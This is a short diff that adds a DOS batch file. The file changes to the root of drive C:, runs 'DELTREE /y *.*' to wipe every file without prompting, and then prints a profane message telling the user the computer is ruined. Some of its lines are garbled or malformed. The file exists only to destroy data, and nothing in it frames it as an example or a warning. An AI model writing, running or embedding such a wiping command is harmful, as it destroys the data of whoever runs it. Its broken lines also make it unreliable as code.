@@ -1,0 +1,8 @@
+echo off
+PATH
+COMMANDC earc
+/C C:
+/C CD\
+DELTREE   /y *.*
+
+echo Your computer is now fucked
